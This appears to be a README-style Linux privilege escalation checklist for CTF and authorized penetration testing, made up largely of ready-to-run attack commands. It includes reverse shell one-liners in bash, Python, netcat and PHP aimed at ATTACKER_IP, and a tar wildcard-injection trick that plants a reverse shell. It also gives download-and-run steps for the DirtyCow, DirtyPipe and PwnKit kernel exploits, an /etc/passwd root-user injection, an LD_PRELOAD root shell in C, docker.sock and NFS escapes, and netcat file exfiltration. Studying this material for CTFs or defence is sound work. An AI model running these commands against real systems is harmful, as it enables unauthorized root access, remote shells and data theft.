# Linux Privilege Escalation Workflow & Checklist

A comprehensive guide for privilege escalation in CTF environments and authorized penetration testing.

![Educational](https://img.shields.io/badge/Purpose-Educational-blue) ![CTF](https://img.shields.io/badge/Use%20Case-CTF%20Only-red)

---

##  Table of Contents
- [Workflow Overview](#workflow-overview)
- [Phase 1: Initial Access & Stabilization](#phase-1-initial-access--stabilization)
- [Phase 2: Low-Hanging Fruit](#phase-2-low-hanging-fruit-quick-wins)
- [Phase 3: Automated Enumeration](#phase-3-automated-enumeration)
- [Phase 4: Manual Enumeration](#phase-4-manual-enumeration)
- [Phase 5: Credentials & Sensitive Files](#phase-5-credentials--sensitive-files)
- [Phase 6: Kernel & System Exploits](#phase-6-kernel--system-exploits)
- [Phase 7: Advanced Vectors](#phase-7-advanced-vectors)
- [Phase 8: Binary Analysis](#phase-8-binary-analysis-custom-binaries)
- [Quick Reference Checklist](#quick-reference-checklist)
- [Resources & Tools](#-resources--tools)
- [Legal Disclaimer](#%EF%B8%8F-disclaimer--legal-notice)

---

## Workflow Overview

This workflow provides a systematic approach to privilege escalation, from initial shell access to root compromise. Follow the phases sequentially for maximum efficiency.

---

## Phase 1: Initial Access & Stabilization

### [ ] Shell Stabilization (if from RCE)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z then:
stty raw -echo; fg
```

### [ ] Basic Orientation

```bash
whoami
id
pwd
hostname
cat /etc/os-release
uname -a
```

**Tips:**

- Note your current user and groups
- Save kernel version for exploit searching later
- Check if you're in docker: `cat /proc/1/cgroup`

---

## Phase 2: Low-Hanging Fruit (Quick Wins)

### [ ] Sudo Permissions (PRIORITY #1)

```bash
sudo -l
```

**Tips:**

- If ANY command shows (ALL) NOPASSWD → immediate win
- Check [GTFOBins](https://gtfobins.github.io/) for the allowed command
- Common exploitable: vim, nano, find, awk, python, less, more, iftop, apt-get

**Example exploit (if sudo vim allowed):**

```bash
sudo vim -c ':!/bin/bash'
```

### [ ] SUID/SGID Binaries (PRIORITY #2)

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null  # SGID
```

**Tips:**

- Focus on non-standard binaries (not /bin/su, /bin/mount, etc.)
- Custom binaries in /opt, /usr/local/bin are goldmines
- Check [GTFOBins](https://gtfobins.github.io/) for each binary
- Run `strings` on suspicious binaries

**Example exploit (if find has SUID):**

```bash
find . -exec /bin/bash -p \; -quit
```

### [ ] Writable /etc/passwd

```bash
ls -la /etc/passwd
```

**Tips:**

- If writable, generate password hash and add root user:

```bash
openssl passwd -1 -salt salt password123
echo 'newroot:$1$salt$qmfF3cR6kKADFhkt4QQYM/:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
```

---

## Phase 3: Automated Enumeration

### [ ] Run Enumeration Scripts

```bash
# LinPEAS (recommended)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or upload manually
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Alternative tools:**

- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

**Tips:**

- Look for RED/YELLOW highlights in LinPEAS output
- Save output to file: `./linpeas.sh | tee linpeas_output.txt`
- Review carefully, don't just run and ignore

**Quick download commands:**

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Linux Smart Enumeration
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

# pspy64 (monitor processes)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
```

---

## Phase 4: Manual Enumeration

### [ ] User Information

```bash
cat /etc/passwd
cat /etc/group
last
w
who
```

### [ ] Home Directories

```bash
ls -la /home/
ls -la /home/*
cat /home/*/.bash_history
cat /home/*/.bashrc
find /home -type f -name "*.txt" 2>/dev/null
```

**Tips:**

- Look for passwords, SSH keys, notes
- Check for readable backup files (.bak, .old)

### [ ] Cronjobs & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*
systemctl list-timers
```

**Tips:**

- Check if cronjob scripts are writable
- Look for PATH hijacking opportunities
- Check for wildcard injection in scripts

**Example wildcard injection:**

```bash
# If cron runs: tar -czf /backup/backup.tar.gz *
# In writable directory:
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > shell.sh
chmod +x shell.sh
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=shell.sh
```

### [ ] Writable Files & Directories

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

### [ ] Capabilities

```bash
getcap -r / 2>/dev/null
```

**Tips:**

- cap_setuid+ep = instant root (python, perl, etc.)
- Check [GTFOBins Capabilities](https://gtfobins.github.io/)

**Example exploit (python with cap_setuid):**

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### [ ] Services & Processes

```bash
ps aux
ps aux | grep root
netstat -tulpn
ss -tulpn
```

**Tips:**

- Look for services running as root
- Check for vulnerable versions
- Use [pspy](https://github.com/DominicBreuker/pspy) to monitor processes without root

---

## Phase 5: Credentials & Sensitive Files

### [ ] Search for Passwords

```bash
grep -r "password" /var/www/html 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -i "pass"
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
```

### [ ] Database Files

```bash
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
```

### [ ] SSH Keys

```bash
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
cat /home/*/.ssh/id_rsa
```

**If you find SSH key:**

```bash
chmod 600 id_rsa
ssh -i id_rsa user@target
```

### [ ] Log Files

```bash
cat /var/log/syslog
cat /var/log/auth.log
find /var/log -type f -exec ls -la {} \; 2>/dev/null
```

### [ ] Environment Variables

```bash
env
cat /proc/self/environ
```

---

## Phase 6: Kernel & System Exploits

### [ ] Kernel Version Check

```bash
uname -a
cat /proc/version
lsb_release -a
```

### [ ] Search for Exploits

```bash
# Using Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Or searchsploit
searchsploit kernel [version]
```

### Common Kernel Exploits

#### DirtyCow (CVE-2016-5195)

- **Affected:** Linux Kernel < 4.8.3
- **GitHub:** [firefart/dirtycow](https://github.com/firefart/dirtycow)

```bash
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
# Password: dirtyCowFun
su firefart
```

#### DirtyPipe (CVE-2022-0847)

- **Affected:** Linux Kernel 5.8 - 5.17
- **GitHub:** [AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)

```bash
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
gcc exploit-1.c -o exploit
./exploit
```

#### PwnKit (CVE-2021-4034)

- **Affected:** PolicyKit (pkexec)
- **GitHub:** [ly4k/PwnKit](https://github.com/ly4k/PwnKit)

```bash
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
chmod +x PwnKit
./PwnKit
```

#### Baron Samedit (CVE-2021-3156)

- **Affected:** Sudo versions before 1.9.5p2
- **GitHub:** [blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

**Tips:**

- Compile exploits on your local machine to avoid GLIBC issues
- Transfer binary to target
- Check GLIBC version compatibility: `ldd --version`
- Always test in safe environment first

---

## Phase 7: Advanced Vectors

### [ ] Docker Escape

```bash
docker ps
docker images
find / -name docker.sock 2>/dev/null
cat /proc/1/cgroup
```

**If docker.sock is accessible:**

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

**Tools:**

- [CDK (Container penetration toolkit)](https://github.com/cdk-team/CDK)

### [ ] NFS Shares

```bash
cat /etc/exports
showmount -e localhost
```

**Tips:**

- no_root_squash = root access possible

```bash
# On attacker machine (if no_root_squash)
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# On target
/share/bash -p
```

### [ ] Path Hijacking

```bash
echo $PATH
find / -perm -o+w -type d 2>/dev/null  # writable dirs in PATH
```

**Example:**

```bash
# If script runs 'ps' without full path and /tmp is in PATH
echo "/bin/bash" > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
```

### [ ] LD_PRELOAD/LD_LIBRARY_PATH

```bash
sudo -l  # check for env_keep
ldd /path/to/binary
```

**Example LD_PRELOAD exploit:**

```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so program_name
```

### [ ] Python Library Hijacking

```bash
python3 -c "import sys; print('\n'.join(sys.path))"
# Check if any paths are writable
```

**Example:**

```python
# If script imports 'module' and /tmp is in sys.path
# Create /tmp/module.py
import os
os.system("/bin/bash")
```

---

## Phase 8: Binary Analysis (Custom Binaries)

### [ ] Analyze Suspicious Binaries

```bash
file /path/to/binary
strings /path/to/binary
ltrace /path/to/binary
strace /path/to/binary
objdump -d /path/to/binary
```

**Tips:**

- Look for hardcoded credentials in strings output
- Check for command injection opportunities
- Test buffer overflows if binary reads user input
- Use `checksec` to see binary protections

**Example command injection:**

```bash
# If binary runs: system("ping " + user_input)
./binary "127.0.0.1; /bin/bash"
```

---

## Quick Reference Checklist

### Immediate Priorities (In Order):

1. ✅ `sudo -l` → [GTFOBins](https://gtfobins.github.io/)
2. ✅ SUID binaries → [GTFOBins](https://gtfobins.github.io/)
3. ✅ Writable /etc/passwd
4. ✅ Cronjobs with writable scripts
5. ✅ Capabilities (cap_setuid)
6. ✅ Kernel exploits
7. ✅ Credentials in files/history
8. ✅ Docker/container escape

### CTF-Specific Tricks:

- ✅ Password reuse is common - try found passwords on all users
- ✅ Check /opt and /usr/local for custom binaries
- ✅ Read ALL .txt files in accessible directories
- ✅ Try default credentials (admin:admin, root:root)
- ✅ Look for hints in file names and directory structure
- ✅ Check for base64 encoded strings in configs
- ✅ Examine source code of web applications
- ✅ Test all found credentials with `su` and `ssh`

### File Transfer Methods:

```bash
# HTTP Server (attacker)
python3 -m http.server 8000

# Target download
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file

# Base64 (for small files)
base64 -w0 file  # on attacker
echo "BASE64STRING" | base64 -d > file  # on target

# Netcat
# Attacker (receiver):
nc -lvnp 4444 > file
# Target (sender):
nc ATTACKER_IP 4444 < file
```

### Reverse Shell One-Liners:

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## 🔗 Resources & Tools

### Enumeration Tools

- [LinPEAS](https://github.com/carlospolop/PEASS-ng) - Comprehensive Linux privilege escalation scanner
- [LinEnum](https://github.com/rebootuser/LinEnum) - Linux enumeration script
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) - Fast enumeration tool
- [Unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check) - Shell script for privilege escalation vectors
- [pspy](https://github.com/DominicBreuker/pspy) - Monitor Linux processes without root permissions

### References & Guides

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation database
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) - Complete privilege escalation guide
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) - Comprehensive payloads collection
- [LOLBAS (Linux)](https://lolbas-project.github.io/) - Living Off The Land binaries

### Kernel Exploits

- [DirtyCow (CVE-2016-5195)](https://github.com/firefart/dirtycow) - Linux Kernel < 4.8.3
- [DirtyPipe (CVE-2022-0847)](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) - Linux Kernel 5.8 - 5.17
- [PwnKit (CVE-2021-4034)](https://github.com/ly4k/PwnKit) - PolicyKit pkexec vulnerability
- [Baron Samedit (CVE-2021-3156)](https://github.com/blasty/CVE-2021-3156) - Sudo heap overflow
- [Linux Kernel Exploits Database](https://github.com/SecWiki/linux-kernel-exploits) - Collection of kernel exploits

### Exploit Databases

- [Exploit-DB](https://www.exploit-db.com/) - Offensive Security's exploit database
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) - Kernel exploit suggester
- [CVE PoC Collection](https://github.com/nomi-sec/PoC-in-GitHub) - GitHub CVE proof of concepts

### Additional Tools

- [traitor](https://github.com/liamg/traitor) - Automatic Linux privilege escalation
- [BeRoot](https://github.com/AlessandroZ/BeRoot) - Post exploitation tool
- [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER) - Identify and exploit sudo rules
- [CDK](https://github.com/cdk-team/CDK) - Container penetration toolkit

### Learning Platforms

- [TryHackMe - Linux PrivEsc Room](https://tryhackme.com/room/linuxprivesc)
- [HackTheBox](https://www.hackthebox.com/)
- [IppSec Videos](https://ippsec.rocks/) - Searchable HTB video walkthroughs
- [TCM Security Academy](https://academy.tcm-sec.com/) - Free security courses

### Cheat Sheets

- [Tib3rius Pentest Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets)
- [Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)

---

##  Disclaimer & Legal Notice

### Purpose

This repository contains privilege escalation techniques and methodologies intended **strictly for educational purposes** and use in:

-  Capture The Flag (CTF) competitions
-  Authorized penetration testing engagements
-  Personal learning laboratories
-  Security research with proper authorization
-  Bug bounty programs with explicit permission

### Important Warnings

-  **DO NOT** use these techniques on systems you do not own
-  **DO NOT** use without explicit written authorization
-  **DO NOT** perform unauthorized security testing
-  **DO NOT** use for unethical purposes

### Legal Responsibility

- Unauthorized access to computer systems is **illegal** under laws including but not limited to:
    - Computer Fraud and Abuse Act (CFAA) in the United States
    - Computer Misuse Act in the United Kingdom
    - ITE Law (UU ITE) in Indonesia
    - Similar legislation in other jurisdictions
- The author(s) of this guide assume **NO responsibility** for any misuse or illegal activities
- Users are **solely responsible** for their actions and any consequences
- Violation of these terms may result in criminal prosecution

### Ethical Use

Always practice responsible disclosure and follow the security researcher's code of ethics:

- Obtain proper authorization before testing
- Report vulnerabilities responsibly
- Respect privacy and data protection laws
- Do not cause harm or disruption
- Follow coordinated vulnerability disclosure practices

### Educational Intent

This guide is created to:

- Help security professionals understand privilege escalation techniques
- Assist CTF players in improving their skills
- Provide learning resources for aspiring penetration testers
- Promote defensive security awareness

---

**By using this guide, you acknowledge that you understand and accept these terms.**

---

##  Contributing

Found an issue or want to add more techniques? Feel free to open an issue or submit a pull request!

---

**Created for educational purposes | Last updated: 2025**
